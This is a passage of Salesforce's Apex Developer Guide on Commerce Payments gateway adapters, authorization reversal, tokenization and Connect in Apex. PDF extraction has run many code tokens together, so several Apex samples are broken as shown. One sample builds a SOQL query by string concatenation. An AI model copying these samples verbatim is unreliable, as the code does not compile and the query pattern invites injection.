b.Complete the required fields. For the URL, enter the URL of your payment gateway.
4.Create a payment gateway provider. The PaymentGatewayProvider object stores details about the payment gateway that Salesforce
Payments communicates with when processing a transaction.
a.Generate an access token according to the instructions in Connect to Connect REST API Using OAuth.
The response includes the access token, specified in the access_token property, and the server instance, specified in the
instance_url property. Use this information to make API calls to build the payment gateway provider.
b.Execute a POST call to the resource using the domain in the instance_url. For example,
https://instance_name.my.salesforce.com/services/data/vapi_version/tooling/sobjects/PaymentGatewayProvider.
Use this payload as the request body, replacing value with the correct data.
{
"ApexAdapterId":"value",
"DeveloperName":"value",
383
Using Salesforce Features with ApexApex Developer Guide

"MasterLabel":"value",
"IdempotencySupported":"value",
"Comments":"value"
}
Example:
{
"ApexAdapterId":"01pxx0000004UU8AAM",
"DeveloperName":"MyNewGatewayProvider",
"MasterLabel":"My New GatewayProvider",
"IdempotencySupported":"Yes",
"Comments":"Custommadegatewayprovider."
}
5.Create a payment gateway record. The PaymentGateway object stores information about the connection to an external payment
gateway. The record requires these field values.
•
Payment Gateway Name: Name of the external payment gateway.
•
Merchant Credential ID: ID of the named credential that you created.
•
Payment Gateway Provider ID: ID of the payment gateway provider that you created.
•
Status: Active
6.Create a webhook by providing a URL in the standard notification transport settings of your external payment gateway. The external
payment gateway uses the webhook to send notifications, as HTTP POST messages, to your asynchronous payment gateway adapter.
The webhook is a combination of your site endpoint with the ID of the payment gateway provider.
a.Use the following URL for your site’s endpoint, replacing domain with your site's domain and URL. For example:
https://MyDomainName.my.salesforce-sites.com/solutions/services/data/v58.0/commerce/payments/notify
Note:  If you’re not using enhanced domains, your org’s Salesforce Sites URL is different. For details, see My Domain URL
Formats in Salesforce Help.
b.Find the ID of your payment gateway provider, and append the ?provider=ID query parameter to the endpoint. For
example,
https://MyDomainName.my.salesforce-sites.com/solutions/services/data/v58.0/commerce/payments/notify?provider=0cJR00000004CEhMAM
c.Enter the webhook in your external payment gateway’s standard notification settings.
SEE ALSO:
Object Reference for the Salesforce Platform: PaymentGatewayProvider
Object Reference for the Salesforce Platform: PaymentGateway
Builder Examples for Payment Gateway Adapters
The final sections of a payment gateway adapter should define how the adapter creates requests and responses. The implementation
of these classes can vary widely based on your gateway and platform requirements. We’ve provided several generics examples for review.
384
Using Salesforce Features with ApexApex Developer Guide

Example:
buildCaptureRequest
privateStringbuildCaptureRequest(commercepayments.CaptureRequestcaptureRequest)
{
BooleanIS_MULTICURRENCY_ORG= UserInfo.isMultiCurrencyOrganization();
QueryUtilsqBuilderForAuth= new QueryUtils(PaymentAuthorization.SObjectType);
qBuilderForAuth.getSelectClause().addField('GatewayRefNumber',false);
qBuilderForAuth.setWhereClause('WHEREId =' + '\''+
captureRequest.paymentAuthorizationId+ '\'');
PaymentAuthorizationauthObject=
(PaymentAuthorization)Database.query(qBuilderForAuth.buildSOQL())[0];
JSONGeneratorjsonGeneratorInstance= JSON.createGenerator(true);
jsonGeneratorInstance.writeStartObject();
jsonGeneratorInstance.writeStringField('merchantAccount',
'{!$Credential.Username}');
jsonGeneratorInstance.writeStringField('originalReference',
authObject.GatewayRefNumber);
jsonGeneratorInstance.writeFieldName('modificationAmount');
jsonGeneratorInstance.writeStartObject();
jsonGeneratorInstance.writeStringField('value',
String.ValueOf((captureRequest.amount* 100.0).intValue()));
jsonGeneratorInstance.writeEndObject();
jsonGeneratorInstance.writeEndObject();
returnjsonGeneratorInstance.getAsString();
}
Example:
createCaptureResponse
privatecommercepayments.GatewayResponsecreateCaptureResponse(HttpResponseresponse)
{
Map<String,Object>mapOfResponseValues= (Map
<String,Object>)JSON.deserializeUntyped(response.getBody());
IntegerstatusCode= response.getStatusCode();
StringresponceValue= (String)mapOfResponseValues.get('response');
if(statusCode== 200){
system.debug('Response- success- Capturereceived');
commercepayments.CaptureResponsecaptureResponse= new
commercepayments.CaptureResponse();
captureResponse.setAsync(true);// Veryimportantto treatthisas an
asynchronoustransaction
captureResponse.setGatewayReferenceNumber((String)mapOfResponseValues.get('pspReference'));
captureResponse.setSalesforceResultCodeInfo(new
commercepayments.SalesforceResultCodeInfo(commercepayments.SalesforceResultCode.Success));
returncaptureResponse;
385
Using Salesforce Features with ApexApex Developer Guide

} else{
system.debug('Response- error- Capturenot receivedby Gateway');
Stringmessage= (String)mapOfResponseValues.get('message');
commercepayments.GatewayErrorResponseerror= new
commercepayments.GatewayErrorResponse(String.valueOf(statusCode),message);
returnerror;
}
}
Payment Authorization Reversal Service
An authorization reversal is a transaction that negates an authorization by releasing the hold on funds in a customer’s payment method.
Authorization Reversal Apex Class Implementation
The Authorization Reversal Service uses the AuthorizationReversalRequest and
AuthorizationReversalResponse classes to manage the creation and storage of authorization reversal information.
Implement these classes in your payment gateway adapter.
Payment Authorization Reversal Service API
An authorization reversal is a transaction that negates an authorization by releasing the hold on funds in a customer’s payment
method. Use the authorization reversal service to provide users with the ability to reverse an outstanding payment authorization.
Authorization Reversal Apex Class Implementation
The Authorization Reversal Service uses the AuthorizationReversalRequest and AuthorizationReversalResponse
classes to manage the creation and storage of authorization reversal information. Implement these classes in your payment gateway
adapter.
AuthorizationReversalRequest
Represents the authorization reversal request. Extends BaseRequest and inherits all its methods.
AuthorizationReversalRequest uses a constructor to build an authorization reversal request record in Salesforce. The
AuthorizationReversalRequest constructor takes no arguments. You can invoke it as follows.
CommercePayments.AuthorizationReversalRequestarr = new
CommercePayments.AuthorizationReversalRequest();
If you want to build a sample authorization reversal, you can also invoke a constructor with arguments for the reversal amount and
payment authorization ID. However, the constructor would only work for test usage and would throw an exception if used outside
of the Apex test context.
commercepayments.AuthorizationReversalRequestauthorizationReversalRequest=
new commercepayments.AuthorizationReversalRequest(80,authObj.id);
AuthorizationReversalResponse
The payment gateway adapter sends this class as a response for an Authorization Reversal request type. Extends
AbstractResponse and inherits its methods.
AuthorizationReversalResponse uses a constructor to build an authorization reversal request record in Salesforce. The
AuthorizationReversalResponse constructor takes no arguments. You can invoke it as follows:
CommercePayments.AuthorizationReversalResponsearp = new
CommercePayments.AuthorizationReversalResponse();
386
Using Salesforce Features with ApexApex Developer Guide

Note:  Salesforce doesn't support bulk operations or custom fields in the authorization reversal process.
Implementing Reversal Classes in Your Gateway Adapter
Add your reversal classes to your payment gateway adapter. We recommend adding AuthorizationReversal as a possible
requestType value when calling processRequest on the gateway’s response.
globalcommercepayments.GatewayResponseprocessRequest(commercepayments.paymentGatewayContext
gatewayContext){
commercepayments.RequestTyperequestType= gatewayContext.getPaymentRequestType();
commercepayments.GatewayResponseresponse;
try {
//addconditionsfor otherrequestTypevalueshere
//..
elseif (requestType== commercepayments.RequestType.AuthorizationReversal){
response=
createAuthReversalResponse((commercepayments.AuthorizationReversalRequest)gatewayContext.getPaymentRequest());}
returnresponse;
Then, add a class that sets the amount of the authorization reversal request, gateway information, and the Salesforce result code.
globalcommercepayments.GatewayResponse
createAuthReversalResponse(commercepayments.AuthorizationReversalRequestauthReversalRequest)
{
commercepayments.AuthorizationReversalResponseauthReversalResponse= new
commercepayments.AuthorizationReversalResponse();
if(authReversalRequest.amount!=null)
{
authReversalResponse.setAmount(authReversalRequest.amount);
}
else
{
thrownew SalesforceValidationException('RequiredFieldMissing: Amount');
}
system.debug('Response- success');
authReversalResponse.setGatewayDate(system.now());
authReversalResponse.setGatewayResultCode('00');
authReversalResponse.setGatewayResultCodeDescription('TransactionNormal');
//Replace'xxxxx'withthe gatewayreferencenumber.
authReversalResponse.setGatewayReferenceNumber('SF'+xxxxx);
authReversalResponse.setSalesforceResultCodeInfo(SUCCESS_SALESFORCE_RESULT_CODE_INFO);
returnauthReversalResponse;
}
387
Using Salesforce Features with ApexApex Developer Guide

Sample Apex Request
StringauthorizationId= '0XcxXXXXXXXXXXXXXXX';
ConnectApi.AuthorizationReversalRequestauthorizationReversalRequest= new
ConnectApi.AuthorizationReversalRequest();
authorizationReversalRequest.amount= 1.0;
authorizationReversalRequest.comments= 'Capturedfromcustomaction';
authorizationReversalRequest.ipAddress= '192.162.10.3';
authorizationReversalRequest.email= 'testuser@example.com';
ConnectApi.AuthorizationReversalResponseauthorizationReversalResponse=
ConnectApi.Payments.reverseAuthorization(authorizationReversalRequest,authorizationId);
StringauthReversalId= authorizationReversalResponse.paymentAuthAdjustment.id;
System.debug(authorizationReversalResponse);
System.debug(authReversalId);
Payment Authorization Reversal Service API
An authorization reversal is a transaction that negates an authorization by releasing the hold on funds in a customer’s payment method.
Use the authorization reversal service to provide users with the ability to reverse an outstanding payment authorization.
Sometimes, a customer performs a payment authorization but then needs to cancel all or part of the authorization later. For example,
the customer bought three items, and then realized that the first item is already in their stock. Commerce Payments API allows you to
reverse all or part of an outstanding payment authorization.
After the customer payment gateway authorizes a payment, Commerce Payments creates a payment authorization record to store
information about the authorization. When a user or process performs a reversal against the authorization, the authorization reversal
service creates a payment authorization adjustment to store information. The adjustment is related to the authorization.
If the payment authorization is associated with an order payment summary, then the reversal amount is added to the order payment
summary’s AuthorizationReversalAmount and subtracted from its AvailableToCaptureAmount. But the
AvailableToCaptureAmount is never below 0, even if a reversal makes its calculation a negative amount.
Note:  For an authorization reversal, the payment gateway log’s OrderPaymentSummaryId always defaults to null. If there’s
an associated order payment summary, your code can set the value.
Call the authorization reversal service by making a POST request to the following endpoint.
Endpoint
/commerce/payments/authorizations/${*authorizationId*}/reversals
The service accepts one authorization reversal request per call. The following payment authorization adjustment API parameters are
accepted.
Table 8: Reversal Service Input Parameters
DescriptionRequiredParameter
Amount to be reversed from the
authorization. Must be greater than zero.
Requiredamount
Salesforce doesn't provide validations
comparing
PaymentAuthorizationAdjustment.Amount
to
PaymentAuthorization.Amount.
388
Using Salesforce Features with ApexApex Developer Guide

DescriptionRequiredParameter
If the payment gateway allows the reversal
amount to be greater than the authorization
amount, the authorization's resulting
balance can be negative. If your gateway
supports authorization balances below zero
and you want to avoid gateway calls,
configure your adapter to query the
authorization amount, balance, and total
reversal amount, and don’t call the endpoint
if the balance is less than zero.
Account ID to which this authorization
reversal is linked.
OptionalaccountId
The date that the reversal applies to the
authorization.
OptionaleffectiveDate
Fraud parameterOptionalemail
Fraud parameterOptionalipAddress
Fraud parameterOptionalmacAddress
Fraud parameterOptionalphone
User-provided comments about the
authorization reversal. Must be less than
1000 characters.
Optionalcomments
Sample Request and Response
This request calls a $150 reversal against an authorization.
{
"accountId":"",
"amount": "150",*  "comments": "authorizationreversalrequest",
"effectiveDate":"2020-10-18T11:32:27.000Z",
"ipAddress": "202.95.77.70",
"macAddress": "00-14-22-01-23-45",
"phone": "100-456-67",
"email": "test@example.org",
"additionalData":{
//addadditionalparametersif needed
"key1":"value1",
"key2":"value2",
"key3":"value3",
"key4":"value4",
"key5":"value5"
}
}
Sample Response - Success
389
Using Salesforce Features with ApexApex Developer Guide

A successful authorization reversal response provides information about the gateway’s response and the values to construct a payment
authorization adjustment entity.
HPP StatusCode:201
{
"gatewayResponse": {
"gatewayDate": "2020-10-23T15:21:58.833Z",
"gatewayReferenceNumber": "439XXXXXXX",
"gatewayResultCode": "00",
"gatewayResultCodeDescription": "TransactionNormal",
"salesforceResultCode": "Success"
},
"paymentAuthAdjustment": {
"amount": "150.0",
"currencyIsoCode": "USD",
"effectiveDate": "2020-10-18T11:32:27.000Z",
"id": "9tvR00000004Cf1MAE",
"paymentAuthAdjustmentNumber": "PAA-00XXXXXXX",
"requestDate": "2020-10-23T15:21:58.000Z",
"status": "Processed"
},
"paymentGatewayLogs": [ {
"createdDate": "2020-10-23T15:21:58.000Z",
"gatewayResultCode": "00",
"id": "0XtXXXXXXXXXXXXXXX",
"interactionStatus": "Success"
} ]
}
The resulting payment authorization adjustment in Salesforce would look like this.
If an error is returned, the response contains the gateway's error code and error message.
Sample Response - Error
{
"errorCode":"",
"errorMessage":""
}
Tokenization Service
The credit card tokenization process replaces sensitive customer information with a one-time algorithmically generated number, called
a token, used during the payment transaction. Salesforce stores the token and then uses that token as a representation of the credit card
used for transactions. The token lets you store information about the credit card without storing sensitive customer data, such as credit
card numbers, in Salesforce.
Tokenization Service Apex Class Implementation
Use the tokenization service to hide sensitive customer payment method data. The Tokenization service uses
PaymentMethodTokenizationRequest, PaymentMethodTokenizationResponse, and
CardPaymentMethodRequest. Implement these classes in your payment gateway adapter.
390
Using Salesforce Features with ApexApex Developer Guide

Tokenization Service API
The credit card tokenization process replaces sensitive customer information with a one-time algorithmically generated number,
called a token, to use during the payment transaction. Salesforce stores the token and then uses that token as a representation of
the credit card used for transactions. The token stores information about the credit card without storing sensitive customer data
such as credit card numbers. To add tokenization capabilities to your payment services, implement our Tokenization API.
Tokenization Service Apex Class Implementation
EDITIONS
Available in: Salesforce
Spring '21 and later
Use the tokenization service to hide sensitive customer payment method data. The Tokenization
service uses PaymentMethodTokenizationRequest,
PaymentMethodTokenizationResponse, and CardPaymentMethodRequest.
Implement these classes in your payment gateway adapter.
Encryption for Tokenized Payment Methods
CommercePayments uses Salesforce field encryption to securely store gateway token values on customer payment method entities
such as DigitalWallet, CardPaymentMethod, and AlternativePaymentMethod.
CardPaymentMethod and DigitalWallet contain the GatewayTokenEncrypted field, available in API v52.0 and later, and the GatewayToken
field, available in API v48.0 and later. Both fields store gateway token values. However, GatewayTokenEncrypted uses Salesforce Classic
Encryption for Custom Fields to securely encrypt the token. GatewayToken doesn't use encryption. To ensure secure tokenization, we
recommend using GatewayTokenEncrypted on your DigitalWallets and CardPaymentMethods. The AlternativePaymentMethod object
uses a GatewayToken field for token storage, however, this field is encrypted on AlternativePaymentMethods.
In API version 52.0 and later, CardPaymentMethods and DigitalWallets can’t store values for GatewayTokenEncryption and GatewayToken
at the same time on the same record. If you try to assign one while the other exists, Salesforce throws an error.
Your payment gateway adapter uses the PaymentMethodTokenizationRequest and
PaymentMethodTokenizationResponse classes to retrieve a gateway token from the payment gateway, encrypt it in
Salesforce, and store the value on a payment method entity. Let's see how we can configure these classes in our payment gateway
adapter.
Implementing Tokenization Classes in Your Gateway Adapter
The following code is used within your PaymentGatewayAdapter Apex class.
Gateway tokens are created and encrypted when the GatewayResponse class's processRequest method receives a tokenization
request. If the request type is Tokenize, GatewayResponse calls the createTokenizeResponse method and passes an
instance of the PaymentMethodTokenizationRequest class. The passed PaymentMethodTokenizationRequest
object contains the address and cardPaymentMethod information that the payment gateway needs to manage the tokenization process.
For example:
globalcommercepayments.GatewayResponseprocessRequest(commercepayments.paymentGatewayContext
gatewayContext){
commercepayments.RequestTyperequestType= gatewayContext.getPaymentRequestType();
commercepayments.GatewayResponseresponse;
try
{
if (requestType== commercepayments.RequestType.Tokenize){
response=
createTokenizeResponse((commercepayments.PaymentMethodTokenizationRequest)gatewayContext.getPaymentRequest());
391
Using Salesforce Features with ApexApex Developer Guide

}
//Addotherelseif statementsfor differentrequesttypesas needed.
returnresponse;
}
catch(SalesforceValidationExceptione)
{
commercepayments.GatewayErrorResponseerror= new
commercepayments.GatewayErrorResponse('400', e.getMessage());
returnerror;
}
}
Configure the createTokenizeResponse method to accept an instance of PaymentMethodTokenizationRequest
and then build an instance of PaymentMethodTokenizationResponse based on the values that it receives from the payment
gateway. The tokenizeResponse contains the results of the gateway's tokenization process, and if successful, the tokenized value. In this
example, we call the setGatewayTokenEncrypted method to set the tokenized value in our tokenization response.
publiccommercepayments.GatewayResponse
createTokenizeResponse(commercepayments.PaymentMethodTokenizationRequesttokenizeRequest)
{
commercepayments.PaymentMethodTokenizationResponsetokenizeResponse= new
commercepayments.PaymentMethodTokenizationResponse();
tokenizeResponse.setGatewayTokenEncrypted(encryptedValue);
tokenizeResponse.setGatewayTokenDetails(tokenDetails);
tokenizeResponse.setGatewayAvsCode(avsCode);
tokenizeResponse.setGatewayMessage(gatewayMessage);
tokenizeResponse.setGatewayResultCode(resultcode);
tokenizeResponse.setGatewayResultCodeDescription(resultCodeDescription);
tokenizeResponse.setSalesforceResultCodeInfo(resultCodeInfo);
tokenizeResponse.setGatewayDate(system.now());
returntokenizeResponse;
}
The setGatewayTokenEncrypted method is available in Salesforce API v52.0 and later. It uses Salesforce classic encryption to
set the encrypted token value that you can store in GatewayTokenEncrypted on a CardPaymentMethod or DigitalWallet, or in GatewayToken
on an AlternativePaymentMethod. We recommend using setGatewayTokenEncrypted to ensure your tokenized payment
method values are encrypted and secure.
/** @descriptionMethodto set Gatewaytokento persistin EncryptedText*/
globalvoidsetGatewayTokenEncrypted(StringgatewayTokenEncrypted){
if (gatewayTokenSet){
throwTokenError();
}
this.delegate.setGatewayTokenEncrypted(gatewayTokenEncrypted);
gatewayTokenEncryptedSet= true;
}
If the instantiated class already has a gateway token, setGatewayTokenEncrypted throws an error.
Note:  While the PaymentMethodTokenizationResponse's setGatewayToken method (available in API v48.0 and later) also
returns a payment method token, the tokenized value isn't encrypted.
392
Using Salesforce Features with ApexApex Developer Guide

Tokenization Service API
The credit card tokenization process replaces sensitive customer information with a one-time algorithmically generated number, called
a token, to use during the payment transaction. Salesforce stores the token and then uses that token as a representation of the credit
card used for transactions. The token stores information about the credit card without storing sensitive customer data such as credit
card numbers. To add tokenization capabilities to your payment services, implement our Tokenization API.
In a typical tokenization process, the payments platform accepts customer payment method data and passes it to a remote token service
server on the payment gateway, outside of Salesforce. The server provides the tokenized value for storage on the platform. For example,
a customer provides a credit card number of 4111111111111234. The token server stores this value, associates it with a token
of 2537446225198291, and sends that token for storage on the platform.
During communication with the merchant, the merchant sends the 2537446225198291 token to the token server. The token
server confirms that it matches the customer’s token, and authorizes the merchant to perform the transaction against the customer’s
card.
The Commerce Payments Tokenization API accepts credit card information and uses the external payment gateway configured through
the customer's Salesforce org to tokenize the card information. It then returns the tokenization representation. The API then saves the
token in CardPaymentMethod.
Call the tokenization service by making a POST request to this endpoint.
/commerce/payments/payment-methods
The Tokenization Service accepts these request parameters from payment and related entities.
DetailsRequired or OptionalParameter
Details of the credit card to be tokenized.
For Type, see CardPaymentMethod
Some of the related fields for this parameter,
shown in the sample request of this topic,
are required. See CardPaymentMethod
cardPaymentMethod
Salesforce Account ID of the card owner.OptionalaccountId
Address information of the customer who
owns the credit card payment method
being tokenized.
Optionaladdress
The external payment gateway related to
the tokenization server.
RequiredpaymentGatewayId
Fraud parameter.Optionalemail
Fraud parameter.OptionalipAddress
Fraud parameter.OptionalmacAddress
Fraud parameter.Optionalphone
Any additional data required by the gateway
to tokenize a credit card payment method.
OptionaladditionalData
393
Using Salesforce Features with ApexApex Developer Guide

Sample Request and Response
This sample request provides a customer's credit card information for tokenization. Some optional parameters are left blank.
{
"cardPaymentMethod": {
"cardHolderName":"CarolSmith",
"expiryMonth": "05",
"expiryYear": "2025",
"startMonth": "",
"startYear": "",
"cvv": "000",
"cardNumber": "4111111111111111",
"cardCategory": "Credit",
"cardType": "Visa",
"nickName": "",
"cardHolderFirstName": "Carol",
"cardHolderLastName": "Smith",
"email": "csmith@example.com",
"comments": "",
"accountId": "000XXXXXXXX"
},
"address":{
"street": "1281st Street",
"city": "SanFrancisco",
"state": "CA",
"country": "USA",
"postalCode": "94015",
"companyName": "Salesforce"
},
"paymentGatewayId": "000XXXXXXXX",
"email": ""
"ipAddress": "",
"macAddress": "",
"phone": "",
"additionalData":{
//addadditionalinformationif needed
"key1":"value1",
"key2":"value2",
"key3":"value3",
"key4":"value4",
"key5":"value5"
}
}
A successful tokenization response updates the payment method and provides information about the gateway response and any
payment gateway logs.
{
"paymentMethod": {
"id": "03OR0000000xxxxxxx",
"accountId": "001xx000000xxxxxxx",
"status": "Active"
},
"gatewayResponse": {
394
Using Salesforce Features with ApexApex Developer Guide

"gatewayResultCode": "00",
"gatewayResultCodeDescription": "TransactionNormal",
"gatewayDate": "2020-12-08T04:03:20.000Z",
"gatewayAvsCode": "7638788018713617",
"gatewayMessage": "8313990738208498",
"salesforceResultCode": "Success",
"gatewayTokenEncrypted": "SF701252"
}
"paymentGatewayLogs": [ {
"createdDate": "2020-12-08T04:03:20.000Z",
"gatewayResultCode": "00",
"id": "0XtR0000000xxxxxxx",
"interactionStatus": "NoOp"
} ],
}
Alternative Payment Methods
EDITIONS
Available in: Salesforce
Spring '21 and later
An alternative payment method allows customers to store and represent payment method
information not represented by another pre-defined payment method such as
CardPaymentMethod or DigitalWallet. Common examples of alternative payment
methods include CashOnDeliver, Klarna, and Direct Debit. Alternative payment methods are available
in API v51.0 and later.
Create a unique record type for each type of alternative payment method in your org. This way,
each of your alternative payment methods can show different picklist values and page layouts based on the method provider and
gateway provider’s requirements. For example, you could have one alternative payment method record type for direct debit and a
different record type for cash on deliver.
We also recommend creating a GtwyProviderPaymentMethodType for each of your unique alternative payment method
record types.
AlternativePaymentMethod has the private sharing model enabled as default for both internal and external users. Only the record owner
and users with higher ownership have Read, Edit, and Delete access.
Example:  Let's say you wanted to make an alternative payment method for GiroPay. First, create an
AlternativePaymentMethod record type.
New RecordType
/services/data/v51.0/sobjects/RecordType
{
"Name": "GiroPay",
"DeveloperName": "GiroPay",
"SobjectType": "AlternativePaymentMethod"
}
Next, create an alternative payment method record for the AlternativePaymentMethod record type.
New AlternativePaymentMethod
/services/data/v51.0/sobjects/AlternativePaymentMethod
{
"ProcessingMode": "External",
395
Using Salesforce Features with ApexApex Developer Guide

"status":"Active",
"GatewayToken":"mHkDsh0oIA3mnWjo9UL",
"NickName": "MyGiroPay",
"RecordTypeId": "{record_type_id}"
}
You can also create a gateway provider payment method type.
New GtwyProvPaymentMethodType
{
"PaymentGatewayProviderId": "XXXXXXXXXXXXXXX",
"PaymentMethodType":"AlternativePaymentMethod",
"GtwyProviderPaymentMethodType": "PM_Giro",
"DeveloperName": "DevName",
"MasterLabel": "MasterLabel",
"RecordTypeId": "{record_type_id}"
}
Process Payments
EDITIONS
Available in: Salesforce
Spring ’20
Process a payment in the payment gateway.
To access commercepayments API, you need the PaymentPlatform org permission.
1.Get the payment capture request object from the PaymentGatewayContextClass.
commercepayments.CaptureRequest=
(commercepayments.CaptureRequest)gatewayContext.getPaymentRequest()
2.Set the HTTP request object.
HttpRequestreq = new HttpRequest();
req.setHeader('Content-Type', 'application/json');
3.Read the parameters from the CaptureRequest object and prepare the HTTP request body.
4.Make the HTTP call to the gateway using the PaymentsHttpClass.
commercepayments.PaymentsHttphttp= new commercepayments.PaymentsHttp();
HttpResponseres = http.send(req);
5.Parse the httpResponse and prepare the CaptureResponse object.
commercepayments.CaptureResponsecaptureResponse= new commercepayments.CaptureResponse();
captureResponse.setGatewayResultCode(“”);
captureResponse.setGatewayResultCodeDescription(“”);
captureResponse.setGatewayReferenceNumber(“”);
captureResponse.setSalesforceResultCodeInfo(getSalesforceResultCodeInfo(commercepayments.SalesforceResultCode.SUCCESS.name()));
captureResponse.setGatewayReferenceDetails(“”);
captureResponse.setAmount(double.valueOf(100);
396
Using Salesforce Features with ApexApex Developer Guide

6.Return the captureResponse.
Process Refund
EDITIONS
Available in: Salesforce
Spring ’20
Process a refund in the payment gateway.
To access the commercepayments API, you need the PaymentPlatform org permission.
1.Get the referenced refund request object from the PaymentGatewayContextClass.
commercepayments.ReferencedRefundRequest=
(commercepayments.ReferencedRefundRequest)gatewayContext.getPaymentRequest();
2.Set the HTTP request object.
HttpRequestreq = new HttpRequest();
req.setHeader('Content-Type','application/json');
3.Read the parameters from the ReferencedRefundRequestobject and prepare the HTTP request body.
4.Make the HTTP call to the gateway using thePaymentsHttpClass.
commercepayments.PaymentsHttphttp= new commercepayments.PaymentsHttp();
HttpResponseres = http.send(req);
5.Parse the httpResponse and prepare the ReferencedRefundResponse object.
commercepayments.ReferencedRefundResponsereferencedRefundResponse= new
commercepayments.ReferencedRefundResponse();
referencedRefundResponse.setGatewayResultCode(“”);
referencedRefundResponse.setGatewayResultCodeDescription(“”);
referencedRefundResponse.setGatewayReferenceNumber(“”);
referencedRefundResponse.setSalesforceResultCodeInfo(getSalesforceResultCodeInfo(commercepayments.SalesforceResultCode.SUCCESS.name()));
referencedRefundResponse.setGatewayReferenceDetails(“”);
referencedRefundResponse.setAmount(double.valueOf(100);
6.Return the referencedRefundResponse.
Idempotency Guidelines
EDITIONS
Available in: Salesforce
Spring ’20
Idempotency represents the ability of a payment gateway to recognize duplicate requests submitted
either in error or maliciously, and then process the duplicate requests accordingly. When working
with an idempotent gateway, consider these important guidelines.
To access the commercepayments API, you need the PaymentPlatform org permission.
The payment gateway adapter class is linked to a paymentGatewayProvider object record. CCS
Payments provides its own layer of idempotency for its own service request. Each payment gateway
can also specify their idempotencySupported value in the paymentGatewayProvider object record. If Salesforce CCS Payment
397
Using Salesforce Features with ApexApex Developer Guide

APIs detects a duplicate request and the gateway provider supports idempotency, the request body’s duplicate parameter becomes
True.
commercepayments.CaptureRequestrequest=
(commercepayments.CaptureRequest)paymentGatewayContext.getPaymentRequest();
BooleanisDuplicate= requestObject.duplicate
The idempotency key can be fetched from the request object.
StringidempotencyKey= request.idempotencyKey
Sample Payment Gateway Implementation for CommercePayments
We’ve created a GitHub repository containing code samples for a sample Payeezy payment gateway implementation with the
CommercePayments namespace. Review the sample code if you need help with configuring your payment gateway implementation.
Review our code samples in the CommercePayments Gateway Reference Implementation for Payeezy repository.
Connect in Apex
Use Connect in Apex to develop custom experiences in Salesforce. Connect in Apex provides programmatic access to B2B Commerce,
CMS managed content, Experience Cloud sites, topics, and more. Create Apex pages that display Chatter feeds, post feed items with
mentions and topics, and update user and group photos. Create triggers that update Chatter feeds.
Many Connect REST API resource actions are exposed as static methods on Apex classes in the ConnectApi namespace. These
methods use other ConnectApi classes to input and return information. The ConnectApi namespace is referred to as Connect
in Apex.
In Apex, you can access some Connect data using SOQL queries and objects. However, it’s simpler to expose data in ConnectApi
classes, and data is localized and structured for display. For example, instead of making several calls to access and assemble a feed, you
can do it with a single call.
Connect in Apex methods execute in the context of the user executing the methods. The code has access to whatever the context user
has access to. It doesn’t run in system mode like other Apex code.
For Connect in Apex reference information, see ConnectApi Namespace.
Connect in Apex Examples
Use these examples to perform common tasks with Connect in Apex.
Connect in Apex Features
This topic describes which classes and methods to use to work with common Connect in Apex features.
Using ConnectApi Input and Output Classes
Some classes in the ConnectApi namespace contain static methods that access Connect REST API data. The ConnectApi
namespace also contains input classes to pass as parameters and output classes that calls to the static methods return.
Understanding Limits for ConnectApi Classes
Limits for methods in the ConnectApi namespace are different than the limits for other Apex classes.
Packaging ConnectApi Classes
If you include ConnectApi classes in a package, be aware of Chatter dependencies.
Serializing and Deserializing ConnectApi Objects
When ConnectApi output objects are serialized into JSON, the structure is similar to the JSON returned from Connect REST API.
When ConnectApi input objects are deserialized from JSON, the format is also similar to Connect REST API.
398
Using Salesforce Features with ApexApex Developer Guide

ConnectApi Versioning and Equality Checking
Versioning in ConnectApi classes follows specific rules that are different than the rules for other Apex classes.
Casting ConnectApi Objects
It may be useful to downcast some ConnectApi output objects to a more specific type.
Wildcards
Use wildcard characters to match text patterns in Connect REST API and Connect in Apex searches.
Testing ConnectApi Code
Like all Apex code, Connect in Apex code requires test coverage.
Differences Between ConnectApi Classes and Other Apex Classes
Note these additional differences between ConnectApi classes and other Apex classes.
Connect in Apex Examples
Use these examples to perform common tasks with Connect in Apex.
Get Feed Elements From a Feed
Call a method to get feed elements from a feed.
Get Feed Elements From Another User’s Feed
Call a method to get feed elements from another user’s feed.
Get Site-Specific Feed Elements from a Feed
Call a method to display a user profile feed that contains only feed elements that are scoped to a specific Experience Cloud site.
Post a Feed Element
Make a call to post a feed element.
Post a Feed Element with a Mention
Call a method or use the ConnectApiHelper repository to post a feed.
Post a Feed Element with Existing Files
Call a method to post a feed element with already uploaded files.
Post a Rich-Text Feed Element with Inline Image
Call a method or use the ConnectApiHelper repository to post a feed element with an already uploaded, inline image.
Post a Rich-Text Feed Element with a Code Block
Call a method to post a feed element with a code block.
Post a Feed Element with a New File (Binary) Attachment
Call a method to post a feed element with a new file.
Post a Batch of Feed Elements
Use a trigger to call a method to bulk post to the feeds of accounts.
Post a Batch of Feed Elements with a New (Binary) File
Use a trigger to call a method to bulk post a new file to the feeds of accounts.
Define an Action Link and Post with a Feed Element
Create one action link in an action link group, associate the action link group with a feed item, and post the feed item.
Define an Action Link in a Template and Post with a Feed Element
Create an action link and action link group and instantiate the action link group from a template.
399
Using Salesforce Features with ApexApex Developer Guide

Edit a Feed Element
Call a method to edit a feed element.
Edit a Question Title and Post
Call a method to edit a question title and post.
Like a Feed Element
Call a method to like a feed element.
Bookmark a Feed Element
Call a method to bookmark a feed element.
Share a Feed Element (prior to Version 39.0)
Call a method to share a feed element.
Share a Feed Element (in Version 39.0 and Later)
Call a method to share a feed element.
Send a Direct Message
Call a method to send a direct message.
Post a Comment
Call a method to post a comment.
Post a Comment with a Mention
Make call or use the ConnectApiHelper repository to post a comment with a mention.
Post a Comment with an Existing File
Make a call to post a comment with an already uploaded file.
Post a Comment with a New File
Call a method to post a comment with a new file.
Post a Rich-Text Comment with Inline Image
Make a call or use the ConnectApiHelper repository to post a comment with an already uploaded, inline image.
Post a Rich-Text Feed Comment with a Code Block
Call a method to post a comment with a code block.
Edit a Comment
Call a method to edit a comment.
Follow a Record
Call a method to follow a record.
Unfollow a Record
Call a method to stop following a record.
Get a Repository
Call a method to get a repository.
Get Repositories
Call a method to get all repositories.
Get Allowed Item Types
Call a method to get allowed item types.
Get Previews
Call a method to get all supported preview formats and their respective URLs.
400
Using Salesforce Features with ApexApex Developer Guide

Get a File Preview
Call a method to get a file preview.
Get Repository Folder Items
Call a method to get a collection of repository folder items.
Get a Repository Folder
Call a method to get a repository folder.
Get a Repository File Without Permissions Information
Call a method to get a repository file without permission information.
Get a Repository File with Permissions Information
Call a method to get a repository file with permission information.
Create a Repository File Without Content (Metadata Only)
Call a method to create a file without binary content (metadata only) in a Google Drive repository folder.
Create a Repository File with Content
